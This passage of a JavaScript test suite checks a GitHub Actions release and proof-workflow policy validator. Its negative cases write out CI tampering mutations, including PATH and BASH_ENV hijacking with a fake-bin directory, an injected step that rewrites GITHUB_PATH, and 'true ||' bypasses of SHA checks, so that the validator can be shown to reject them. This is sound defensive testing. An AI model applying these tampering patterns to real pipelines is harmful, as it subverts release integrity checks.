    ],
  ]);
  // Substring semantics: `publication_survives` legitimately selects the `full_…_restart` test.
  const violations = [];
  validateCargoTestFilters(workflows, violations, identifiers, () => originalReaddir);
  assert.deepEqual(violations, []);

  const renamed = new Set(["tests", "demo_tests", "renamed_publication_check"]);
  const afterRename = [];
  validateCargoTestFilters(workflows, afterRename, identifiers, () => renamed);
  assert.match(afterRename.join("\n"), /selects no test: publication_survives/u);
  assert.match(afterRename.join("\n"), /selects no test: full_publication_survives_restart/u);
});

test("third-party action policy reads only parsed uses values", () => {
  const valid = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  check:
    timeout-minutes: 5
    steps:
      - uses: vendor/action@${fullSha}
# uses: vendor/action@main
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", valid), []);

  const invalid = structuredClone(valid);
  invalid.jobs.check.steps[0].uses = "vendor/action@main";
  assert.match(basicWorkflowViolations("fixture.yml", invalid).join("\n"), /full-length SHA/u);
});

test("release authority accepts only exact live auto-main or manual-dev routes", async (t) => {
  const auto = {
    EXPECTED_HEAD_SHA: "",
    GITHUB_EVENT_NAME: "push",
    GITHUB_REF: "refs/heads/main",
    GITHUB_SHA: fullSha,
    GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/auto-release.yml@refs/heads/main",
    PUBLISH_RELEASE: "true",
  };
  const manual = {
    EXPECTED_HEAD_SHA: fullSha,
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_REF: "refs/heads/dev/codestory-next",
    GITHUB_SHA: fullSha,
    GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/release.yml@refs/heads/dev/codestory-next",
    PUBLISH_RELEASE: "",
  };

  await t.test("trusted auto push on live main", () => {
    const result = runReleaseAuthority(auto);
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });
  await t.test("manual proof on exact live dev", () => {
    const result = runReleaseAuthority(manual);
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });
  await t.test("manual event cannot claim publication", () => {
    const result = runReleaseAuthority({ ...manual, PUBLISH_RELEASE: "true" });
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /Publication authority requires the trusted reusable-workflow caller/u);
  });
  await t.test("wrong automatic caller is rejected", () => {
    const result = runReleaseAuthority({
      ...auto,
      GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/rogue.yml@refs/heads/main",
    });
    assert.notEqual(result.status, 0);
  });
  await t.test("stale main is rejected", () => {
    const result = runReleaseAuthority(auto, "2".repeat(40));
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /main moved from release head/u);
  });
  await t.test("wrong manual SHA is rejected", () => {
    const result = runReleaseAuthority({ ...manual, EXPECTED_HEAD_SHA: "2".repeat(40) });
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /does not match workflow head/u);
  });
  await t.test("stale dev is rejected", () => {
    const result = runReleaseAuthority(manual, "2".repeat(40));
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /dev\/codestory-next moved from proved head/u);
  });
});

test("release-head calibration lineage rejects identities and source shapes around the freeze", async (t) => {
  const fixtureRoot = mkdtempSync(
    path.join(os.tmpdir(), "codestory-release-lineage-"),
  );
  t.after(() => rmSync(fixtureRoot, { recursive: true, force: true }));
  const repository = path.join(fixtureRoot, "repository");
  mkdirSync(repository, { recursive: true });
  calibrationGit(repository, "-c", "init.defaultBranch=main", "init", "-q");
  writeCalibrationFixture(repository, "README.md", "release lineage fixture\n");
  writeCalibrationFixture(
    repository,
    calibrationConstantSet,
    `${JSON.stringify({ status: "unfrozen", freeze_record: null }, null, 2)}\n`,
  );
  const calibrated = commitCalibrationFixture(repository, "calibrate");
  const frozenContract = {
    status: "frozen",
    freeze_record: {
      selection_source_commit: calibrated.commit,
      selection_source_tree: calibrated.tree,
    },
  };
  writeCalibrationFixture(
    repository,
    calibrationConstantSet,
    `${JSON.stringify(frozenContract, null, 2)}\n`,
  );
  const frozen = commitCalibrationFixture(repository, "freeze constants");

  await t.test("the one-file freeze is accepted", () => {
    const result = runCalibrationReleaseCheck(repository, frozen.commit);
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const receipt = JSON.parse(result.stdout);
    assert.equal(receipt.status, "passed");
    assert.equal(receipt.selection_commit, calibrated.commit);
    assert.equal(receipt.frozen_commit, frozen.commit);
    assert.deepEqual(receipt.allowed_changed_paths, [calibrationConstantSet]);
  });

  await t.test("a caller-supplied SHA that is not the checkout is rejected", () => {
    const result = runCalibrationReleaseCheck(repository, calibrated.commit);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release checkout does not match the expected release source/u);
  });

  await t.test("a tree-preserving promotion commit stays bound", () => {
    calibrationGit(
      repository,
      "commit",
      "--allow-empty",
      "--no-verify",
      "-q",
      "-m",
      "promote frozen tree",
    );
    const promoted = calibrationGit(repository, "rev-parse", "HEAD");
    const result = runCalibrationReleaseCheck(repository, promoted);
    assert.equal(result.status, 0, result.stderr || result.stdout);
    calibrationGit(repository, "reset", "--hard", frozen.commit);
  });

  await t.test("a freeze record carrying the wrong calibration tree is rejected", () => {
    writeCalibrationFixture(
      repository,
      calibrationConstantSet,
      `${JSON.stringify({
        ...frozenContract,
        freeze_record: {
          ...frozenContract.freeze_record,
          selection_source_tree: "f".repeat(40),
        },
      }, null, 2)}\n`,
    );
    const wrongTree = commitCalibrationFixture(repository, "forge calibration tree");
    const result = runCalibrationReleaseCheck(repository, wrongTree.commit);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /calibration commit does not resolve to the recorded calibration tree/u);
    calibrationGit(repository, "reset", "--hard", frozen.commit);
  });

  await t.test("source drift after the freeze is rejected and named", () => {
    writeCalibrationFixture(repository, "README.md", "post-freeze source drift\n");
    const drifted = commitCalibrationFixture(repository, "change source after freeze");
    const result = runCalibrationReleaseCheck(repository, drifted.commit);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /post-calibration source drift exceeded/u);
    assert.match(result.stderr, /README\.md/u);
  });
});

test("release policy keeps the release-head lineage check mandatory and exact", async (t) => {
  const stepName = "Verify release-head calibration lineage";
  const cases = [
    ["missing step", workflows => {
      const steps = workflows.get("release.yml").jobs.preflight.steps;
      workflows.get("release.yml").jobs.preflight.steps = steps
        .filter(step => step.name !== stepName);
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["conditional publishing-only step", workflows => {
      draftStep(workflows.get("release.yml").jobs.preflight, stepName).if
        = "inputs.publish_release";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["advisory continue-on-error step", workflows => {
      draftStep(workflows.get("release.yml").jobs.preflight, stepName)["continue-on-error"]
        = true;
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["advisory preflight job", workflows => {
      workflows.get("release.yml").jobs.preflight["continue-on-error"] = true;
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["conditional preflight job", workflows => {
      workflows.get("release.yml").jobs.preflight.if = "inputs.publish_release";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["job PATH shadows the lineage interpreter", workflows => {
      workflows.get("release.yml").jobs.preflight.env = {
        PATH: "${{ github.workspace }}/scripts/fake-bin:${{ env.PATH }}",
      };
    }, /preflight must retain the exact trusted job environment/u],
    ["job BASH_ENV changes lineage execution", workflows => {
      workflows.get("release.yml").jobs.preflight.env = {
        BASH_ENV: "${{ github.workspace }}/scripts/fake-bin/bash-env",
      };
    }, /preflight must retain the exact trusted job environment/u],
    ["job shell defaults change lineage execution", workflows => {
      workflows.get("release.yml").jobs.preflight.defaults = {
        run: { shell: "bash --noprofile --norc -e {0}" },
      };
    }, /preflight must retain the exact trusted job environment/u],
    ["workflow PATH shadows the lineage interpreter", workflows => {
      workflows.get("release.yml").env = {
        PATH: "${{ github.workspace }}/scripts/fake-bin:${{ env.PATH }}",
      };
    }, /release workflow must not override the release-head calibration execution environment/u],
    ["workflow BASH_ENV changes lineage execution", workflows => {
      workflows.get("release.yml").env = {
        BASH_ENV: "${{ github.workspace }}/scripts/fake-bin/bash-env",
      };
    }, /release workflow must not override the release-head calibration execution environment/u],
    ["workflow shell defaults change lineage execution", workflows => {
      workflows.get("release.yml").defaults = {
        run: { shell: "bash --noprofile --norc -e {0}" },
      };
    }, /release workflow must not override the release-head calibration execution environment/u],
    ["interpreter uses PATH lookup", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step.run = step.run.replace("/usr/bin/python3 -E -s", "python");
    }, /must use the pinned interpreter on the exact release checkout/u],
    ["lineage shell uses PATH lookup", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step.shell = "bash -e {0}";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["lineage step sources a hostile BASH_ENV", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step.env.BASH_ENV = "${{ github.workspace }}/scripts/fake-bin/bash-env";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["lineage step changes working directory", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step["working-directory"] = "${{ runner.temp }}";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["lineage step injects another environment variable", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step.env.PYTHONPATH = "${{ github.workspace }}/scripts/fake-python";
    }, /release-head calibration lineage must be unconditional and fail closed/u],
    ["step inserted before lineage", workflows => {
      workflows.get("release.yml").jobs.preflight.steps.splice(1, 0, {
        name: "Rewrite execution environment",
        run: 'echo "$GITHUB_WORKSPACE/scripts/fake-bin" >> "$GITHUB_PATH"',
      });
    }, /must run immediately after checkout and before other release work/u],
    ["wrong release SHA", workflows => {
      const step = draftStep(workflows.get("release.yml").jobs.preflight, stepName);
      step.run = step.run.replace("$GITHUB_SHA", "$EXPECTED_HEAD_SHA");
    }, /must use the pinned interpreter on the exact release checkout/u],
  ];
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  for (const [name, mutate, expected] of cases) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
});

test("proof resolvers reject hostile refs, SHAs, and labeled-event drift before proof work", async (t) => {
  const otherSha = "2".repeat(40);
  const sourceEnvironment = {
    PR_NUMBER: "1230",
    EXPECTED_HEAD_SHA: fullSha,
    CALLER_REF: "",
    EVENT_PR_NUMBER: "",
    EVENT_HEAD_SHA: "",
    EVENT_HEAD_REPO: "",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_SHA: fullSha,
  };
  await t.test("source PR dispatch", () => {
    const rejected = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref codex\/exact-head/u);

    const wrongSha = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
      GITHUB_SHA: otherSha,
    });
    assert.notEqual(wrongSha.status, 0);
    assert.match(wrongSha.stdout, /Workflow SHA .* is not reviewed PR head/u);

    const accepted = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });

  await t.test("source labeled event", () => {
    const environment = {
      PR_NUMBER: "",
      EXPECTED_HEAD_SHA: "",
      CALLER_REF: "",
      EVENT_PR_NUMBER: "1230",
      EVENT_HEAD_SHA: fullSha,
      EVENT_HEAD_REPO: "TheGreenCedar/CodeStory",
      GITHUB_EVENT_NAME: "pull_request",
      GITHUB_REF: "refs/pull/1230/merge",
      GITHUB_SHA: fullSha,
    };
    const accepted = runResolver("source-proof.yml", "resolve", environment);
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);

    const drifted = runResolver("source-proof.yml", "resolve", {
      ...environment,
      EVENT_HEAD_SHA: otherSha,
    });
    assert.notEqual(drifted.status, 0);
    assert.match(drifted.stdout, /moved after the review-accepted label event/u);
  });

  const packagedEnvironment = {
    INPUT_PR_NUMBER: "1230",
    INPUT_HEAD_SHA: fullSha,
    INPUT_MODE: "platform",
    EVENT_PR_NUMBER: "",
    EVENT_HEAD_SHA: "",
    EVENT_HEAD_REPO: "",
    INPUT_SOURCE_RUN_ID: "",
    INPUT_CALIBRATION_ARTIFACT: "",
    INPUT_CALIBRATION_RUN_ID: "",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_SHA: fullSha,
  };
  await t.test("platform PR dispatch", () => {
    const rejected = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref codex\/exact-head/u);

    const wrongSha = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
      GITHUB_SHA: otherSha,
    });
    assert.notEqual(wrongSha.status, 0);
    assert.match(wrongSha.stdout, /Workflow SHA .* is not accepted PR head/u);

    const accepted = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });

  await t.test("platform labeled event", () => {
    const environment = {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_HEAD_SHA: "",
      INPUT_MODE: "",
      EVENT_PR_NUMBER: "1230",
      EVENT_HEAD_SHA: fullSha,
      EVENT_HEAD_REPO: "TheGreenCedar/CodeStory",
      GITHUB_EVENT_NAME: "pull_request",
      GITHUB_REF: "refs/pull/1230/merge",
    };
    const accepted = runResolver("packaged-platform-pr.yml", "route", environment);
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);

    const drifted = runResolver("packaged-platform-pr.yml", "route", {
      ...environment,
      EVENT_HEAD_SHA: otherSha,
    });
    assert.notEqual(drifted.status, 0);
    assert.match(drifted.stdout, /moved after the platform-proof label event/u);
  });

  await t.test("integration dispatch", () => {
    const rejected = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_MODE: "integration",
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref dev\/codestory-next/u);

    const accepted = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_MODE: "integration",
      GITHUB_REF: "refs/heads/dev/codestory-next",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });
});

test("exact proof policy rejects trigger and identity downgrades", async (t) => {
  const sourceFile = "source-proof.yml";
  const packagedCoordinatorFile = "packaged-platform-pr.yml";
  const packagedProofFile = "packaged-platform-proof.yml";
  const linuxVulkanFile = "linux-vulkan-proof.yml";
  const windowsVulkanFile = "windows-vulkan-proof.yml";
  const metalProofFile = "macos-metal-proof.yml";
  const sourceResolver = workflow => draftStep(workflow.jobs.resolve, "Resolve trusted exact head");
  const packagedResolver = workflow => draftStep(workflow.jobs.route, "Resolve trusted exact head");

  const mutations = [
    ["source synchronize trigger", sourceFile, workflow => {
      workflow.on.pull_request.types.push("synchronize");
    }, /trigger must be label-only/u],
    ["platform synchronize trigger", packagedCoordinatorFile, workflow => {
      workflow.on.pull_request.types.push("synchronize");
    }, /trigger must be label-only/u],
    ["source PR-number-only concurrency", sourceFile, workflow => {
      workflow.concurrency.group = "source-proof-${{ inputs.pr_number || github.event.pull_request.number }}";
    }, /concurrency must bind the Actions SHA/u],
    ["platform PR-number-only concurrency", packagedCoordinatorFile, workflow => {
      workflow.concurrency.group = "proof-${{ inputs.mode }}-${{ inputs.pr_number }}";
    }, /concurrency must bind the Actions SHA/u],
    ["source manual SHA equality", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*EXPECTED_HEAD_SHA/u],
    ["source manual SHA short-circuit", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          'test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA" || {',
          'true || test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA" || {',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source labeled branch disabled", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          'if [ -n "$EVENT_PR_NUMBER" ]; then',
          'if false && [ -n "$EVENT_PR_NUMBER" ]; then',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source resolver exits before trusted checks", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          "set -euo pipefail",
          'set -euo pipefail\necho "ref=$GITHUB_SHA" >> "$GITHUB_OUTPUT"\nexit 0',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source resolver blank line", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace("set -euo pipefail\n", "set -euo pipefail\n\n");
    }, /exact normalized trusted resolver script contract/u],
    ["source labeled job disabled", sourceFile, workflow => {
      workflow.jobs.resolve.if
        = "false && (github.event.action == 'labeled' && github.event.label.name == 'review-accepted')";
    }, /only review-accepted labeled PR runs/u],
    ["source manual ref equality", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace('test "$GITHUB_REF" = "refs\/heads\/$head_ref"', 'test -n "$GITHUB_REF"');
    }, /GITHUB_REF.*head_ref/u],
    ["platform manual SHA equality", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$INPUT_HEAD_SHA"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*INPUT_HEAD_SHA/u],
    ["platform manual SHA short-circuit", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'test "$GITHUB_SHA" = "$INPUT_HEAD_SHA" || {',
          'true || test "$GITHUB_SHA" = "$INPUT_HEAD_SHA" || {',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform labeled branch disabled", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'if [ -n "$EVENT_HEAD_REPO" ]; then',
          'if false && [ -n "$EVENT_HEAD_REPO" ]; then',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform resolver exits before trusted checks", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          "set -euo pipefail",
          'set -euo pipefail\necho "head_sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"\nexit 0',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform resolver backslash continuation blank line", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'if [ -n "$INPUT_SOURCE_RUN_ID" ] \\\n    ||',
          'if [ -n "$INPUT_SOURCE_RUN_ID" ] \\\n\n    ||',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform labeled job disabled", packagedCoordinatorFile, workflow => {
      workflow.jobs.route.if
        = "false && (github.event.action == 'labeled' && github.event.label.name == 'platform-proof')";
    }, /only platform-proof labeled PR runs/u],
    ["integration live dev SHA equality", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$dev_head"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*dev_head/u],
    ["hosted-only integration scope removed", packagedCoordinatorFile, workflow => {
      workflow.on.workflow_dispatch.inputs.scope.options
        = workflow.on.workflow_dispatch.inputs.scope.options.filter(scope => scope !== "none");
    }, /dispatch scopes changed/u],
    ["exact integration Linux scope removed", packagedCoordinatorFile, workflow => {
      const step = draftStep(workflow.jobs.route, "Select change-aware proof scope");
      step.run = step.run.replace(' || [ "$REQUESTED_SCOPE" = linux ]', "");
    }, /integration must preserve explicit no-op and Linux scopes/u],
    ["release evidence runs implicitly", packagedCoordinatorFile, workflow => {
      workflow.jobs["release-evidence"].if = "needs.route.outputs.mode != 'calibration'";
    }, /optional release evidence must run only in explicit release-evidence mode/u],
    ["package waits for release evidence", packagedCoordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].needs.push("release-evidence");
    }, /package proof must not depend on optional release evidence/u],
    ["protected Linux proof removed", packagedCoordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].uses = "./.github/workflows/packaged-platform-proof.yml";
    }, /Linux proof must use the protected Vulkan workflow/u],
    ["protected Linux candidate proof disabled", packagedCoordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].with.candidate_installed_proof = false;
    }, /Linux proof must close Vulkan and candidate-installed claims/u],
    ["manual Linux candidate trusts a non-producer", linuxVulkanFile, workflow => {
      workflow.on.workflow_dispatch.inputs.candidate_producer_workflow_path.default
        = ".github/workflows/release.yml";
    }, /manual candidate proof must trust the package-producing workflow/u],
    ["closeout skips protected Linux", packagedCoordinatorFile, workflow => {
      workflow.jobs.closeout.needs = workflow.jobs.closeout.needs
        .filter(name => name !== "linux-vulkan-proof");
    }, /closeout must wait for every selected platform proof/u],
    ["closeout waits for release evidence", packagedCoordinatorFile, workflow => {
      workflow.jobs.closeout.needs.push("release-evidence");
    }, /normal closeout must not depend on optional release evidence/u],
    ["Linux package matrix scope removed", packagedProofFile, workflow => {
      workflow.jobs.build.strategy.matrix
        = workflow.jobs.build.strategy.matrix.replace("inputs.scope == 'linux'", "inputs.scope == 'windows'");
    }, /matrix must select structural JSON by scope/u],
    ["package build loses the history the freeze lineage probe reads", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Checkout").with["fetch-depth"] = 1;
    }, /package build must keep full history for the calibration freeze lineage probe/u],
    ["reachable lineage proof stops enforcing the freeze lineage", packagedProofFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Prove frozen calibration source lineage");
      const removed = step.run.replace("  --enforce-calibration-freeze-lineage \\\n", "");
      assert.notEqual(removed, step.run, "freeze lineage flag was already absent");
      step.run = removed;
    }, /must pass --enforce-calibration-freeze-lineage on the invocation that reads the calibration bundle/u],
    ["reachable lineage proof parks the flag on a decoy", packagedProofFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Prove frozen calibration source lineage");
      const stripped = step.run.replace("  --enforce-calibration-freeze-lineage \\\n", "");
      assert.notEqual(stripped, step.run, "freeze lineage flag was already absent");
      step.run = `${stripped}echo skipping python .github/scripts/check-packaged-agent-proof.py \\\n  --enforce-calibration-freeze-lineage \\\n  --out-dir target/decoy\n`;
    }, /must pass --enforce-calibration-freeze-lineage on the invocation that reads the calibration bundle/u],
    ["reachable lineage proof stops binding the verified source identity", packagedProofFile, workflow => {
      delete draftStep(workflow.jobs.build, "Prove frozen calibration source lineage").env.SOURCE_SHA;
    }, /must bind the verified source identity and the authenticated producer/u],
    ["reachable lineage proof is removed entirely", packagedProofFile, workflow => {
      workflow.jobs.build.steps = workflow.jobs.build.steps
        .filter(({ name }) => name !== "Prove frozen calibration source lineage");
    }, /must contain named step Prove frozen calibration source lineage/u],
    // Reachability, not presence. Each of these leaves the flag exactly where it
    // is and only makes the step impossible to reach from the frozen-candidate
    // coordinator -- which is how the guard went dark the first time.
    ["lineage proof re-gated on the release evidence its caller cannot pass", packagedProofFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Prove frozen calibration source lineage");
      step.if = `${step.if} && inputs.quality_evidence_artifact != ''`;
    }, /Prove frozen calibration source lineage must be reachable from a packaged-platform-pr\.yml frozen-candidate dispatch/u],
    ["lineage proof re-gated onto the unfrozen calibration collection", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Prove frozen calibration source lineage").if
        = "matrix.asset_target == 'linux-x64' && inputs.calibration_mode && inputs.calibration_bundle_artifact != ''";
    }, /Prove frozen calibration source lineage must be reachable from a packaged-platform-pr\.yml frozen-candidate dispatch/u],
    ["lineage proof moved onto a package cell the matrix never builds", packagedProofFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Prove frozen calibration source lineage");
      step.if = step.if.replace("linux-x64", "linux-arm64");
    }, /Prove frozen calibration source lineage must be reachable from a packaged-platform-pr\.yml frozen-candidate dispatch/u],
    ["frozen-candidate coordinator stops forwarding the calibration bundle", packagedCoordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.calibration_bundle_artifact = "";
    }, /Prove frozen calibration source lineage must be reachable from a packaged-platform-pr\.yml frozen-candidate dispatch/u],
    ["frozen-candidate coordinator stops forwarding the producer run", packagedCoordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.calibration_bundle_run_id = "";
    }, /packaged proof must forward the dispatched calibration bundle identity so the freeze lineage guard can run/u],
    ["package evaluation downloads calibration on the standard path", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Authenticate calibration bundle producer").if
        = "matrix.asset_target == 'linux-x64'";
      draftStep(workflow.jobs.build, "Download frozen calibration bundle").if
        = "matrix.asset_target == 'linux-x64'";
    }, /packaged-platform-proof\.yml/u],
    ["package workflow reclaims candidate-installed proof", packagedProofFile, workflow => {
      workflow.on.workflow_call.inputs.candidate_installed_proof = {
        required: false,
        default: false,
        type: "boolean",
      };
    }, /package-only workflow must not define candidate_installed_proof/u],
    ["Metal calibration reads the calibration contract from an unpinned location", metalProofFile, workflow => {
      const step = draftStep(
        workflow.jobs["packaged-metal"],
        "Collect three independent Metal constant calibration runs",
      );
      step.run = step.run.replaceAll(
        "crates/codestory-llama-sys/per-user-embedding-server-constant-set.json",
        "per-user-embedding-server-constant-set.json",
      );
    }, /Collect three independent Metal constant calibration runs must run test "\$\(jq -r \.status crates\/codestory-llama-sys\/per-user-embedding-server-constant-set\.json\)"/u],
    ["Vulkan model preparation drops the bypass shell", windowsVulkanFile, workflow => {
      delete draftStep(workflow.jobs["packaged-vulkan"], "Prepare checksum-pinned embedded model").shell;
    }, /Prepare checksum-pinned embedded model must declare the bypass shell/u],
  ];

  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("source proof keeps retrieval generalization parallel on the resolved head", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const sourceFile = "source-proof.yml";
  const job = workflow => workflow.jobs["retrieval-generalization"];

  const mutations = [
    ["job removed", workflow => {
      delete workflow.jobs["retrieval-generalization"];
    }, /retrieval-generalization/u],
    ["job serialized after Rust", workflow => {
      job(workflow).needs = ["resolve", "full-source-gate"];
    }, /must run in parallel on the resolved exact head/u],
    ["reuse guard widened", workflow => {
      job(workflow).if = "always()";
    }, /must run in parallel on the resolved exact head/u],
    ["job made optional", workflow => {
      job(workflow)["continue-on-error"] = true;
    }, /must run in parallel on the resolved exact head/u],
    ["runner changed", workflow => {
      job(workflow)["runs-on"] = "windows-latest";
    }, /must run in parallel on the resolved exact head/u],
    ["timeout widened", workflow => {
      job(workflow)["timeout-minutes"] = 60;
    }, /must run in parallel on the resolved exact head/u],
    ["checkout ref widened", workflow => {
      job(workflow).steps[0].with.ref = "${{ github.sha }}";
    }, /must check out the resolved exact ref/u],
    ["Node version changed", workflow => {
      job(workflow).steps[1].with["node-version"] = "22";
    }, /must use blocking Node 24/u],
    ["hostile matrix changed", workflow => {
      draftStep(job(workflow), "Generalization lint hostile matrix").run
        = "node --test scripts/tests/something-else.test.mjs";
    }, /hostile matrix must run its exact blocking Node command/u],
    ["hostile matrix made optional", workflow => {
      draftStep(job(workflow), "Generalization lint hostile matrix")["continue-on-error"] = true;
    }, /hostile matrix must run its exact blocking Node command/u],
    ["full source reuse guard widened", workflow => {
      workflow.jobs["full-source-gate"].if = "always()";
    }, /full source gate may skip only a completed exact-head proof/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(sourceFile));
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("source proof reuse accepts only whole successful workflow runs", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const mutations = [
    ["source self-reuse", workflows => {
      const step = draftStep(
        workflows.get("source-proof.yml").jobs.resolve,
        "Reuse a completed gate for this exact head",
      );
      step.run = step.run.replace(
        '(.event == "pull_request" or .event == "workflow_dispatch") and .conclusion == "success"',
        '(.event == "pull_request" or .event == "workflow_dispatch")',
      );
    }, /source-proof\.yml step Reuse a completed gate.*workflow_dispatch.*conclusion/u],
    ["release preflight reuse", workflows => {
      const step = draftStep(
        workflows.get("release.yml").jobs.preflight,
        "Resolve reusable prior evidence",
      );
      step.run = step.run.replace(
        ".head_repository.full_name == $repo and .conclusion == \"success\"",
        ".head_repository.full_name == $repo",
      );
    }, /release\.yml step Resolve reusable prior evidence.*conclusion/u],
    ["packaged prior proof lookup", workflows => {
      const step = draftStep(
        workflows.get("packaged-platform-pr.yml").jobs.route,
        "Require successful exact-head source proof",
      );
      step.run = step.run.replace(
        '(.event == "pull_request" or .event == "workflow_dispatch") and .conclusion == "success"',
        '(.event == "pull_request" or .event == "workflow_dispatch")',
      );
    }, /packaged-platform-pr\.yml step Require successful exact-head source proof.*conclusion/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
